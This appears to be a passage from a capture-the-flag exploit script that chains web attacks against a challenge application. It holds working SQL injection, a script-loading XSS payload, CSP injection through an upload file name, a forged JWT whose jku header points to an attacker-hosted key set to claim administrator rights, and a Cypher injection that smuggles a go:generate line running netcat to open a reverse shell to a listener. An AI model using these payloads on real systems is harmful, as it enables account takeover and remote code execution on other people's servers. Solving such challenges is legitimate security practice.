    'field': 'identifier',
    'query_eq': 'a\\\\',
    'query_like': ';INSERT INTO trusted_external_token_providers(host_url) VALUES(""" + char_string + """)-- -'
};

var formBody = [];
for (var property in details) {
  var encodedKey = encodeURIComponent(property);
  var encodedValue = encodeURIComponent(details[property]);
  formBody.push(encodedKey + "=" + encodedValue);
}
formBody = formBody.join("&");

fetch(`/panel/home`, { 
    method: 'POST', 
    credentials: 'include',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
      },
    body: formBody
})
"""

with open('./test.js', "w") as fh:
    fh.write(js_source)

body['antivirus'] = f"<script src=\"{HTTP_SERVER}/test.js\"></script>"

# change to your image name
f = "file.png"
with open(f, "rb") as fh:
    r = sess.post(
		f"http://{url}:{port}/comms/update/{ID}/{token}", 
		data=body, 
		files={
			# file name will inject into CSP
			"image": ("; script-src 'none'; script-src-elem *; img-src blah.png", fh, "text/html")
		}
	)
# debug
print(r.text)

# boilerplate code copied from chal to replicate key gen
private_key = rsa.generate_private_key(
	public_exponent=65537,
	key_size=2048
)

pem_private_key = private_key.private_bytes(
	encoding=serialization.Encoding.PEM,
	format=serialization.PrivateFormat.PKCS8,
	encryption_algorithm=serialization.NoEncryption(),
).decode()

public_numbers = private_key.public_key().public_numbers()
n_base64 = base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, "big")).rstrip(b"=").decode()
e_base64 = base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, "big")).rstrip(b"=").decode()

jwks = {
	"keys": [
		{
			"kty": "RSA",
			"alg": "RS256",
			"use": "sig",
			"kid": "1",
			"n": n_base64,
			"e": e_base64
		}
	]
}

with open('./pub.json', "w") as file:
    json.dump(jwks, file)

header = {
	"alg": "RS256",
	"jku": f"{HTTP_SERVER}/pub.json"
}

payload = {
	"username": 'hacked',
	"account_type": 'administrator'
}

token = jwt.encode(payload, pem_private_key, algorithm="RS256", headers=header)

sess.cookies.update({'jwt':token})

r = sess.get(f"http://{url}:{port}/panel/network")

# go:generate injection
go_gen_payload = urllib.parse.quote(f'"\n//go:generate nc {listener_ip} {listener_port} -e /bin/sh\n//', safe='')

# neo4j injection
cypher_payload = f"' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name LOAD CSV FROM 'http://127.0.0.1:1337/panel/server?server_url={go_gen_payload}&token={token}' as l RETURN 1 as identifier1,2 as identifier2/*"


print("catch that shell ;)")

r = sess.post(f"http://{url}:{port}/panel/network", data={'query':cypher_payload})

```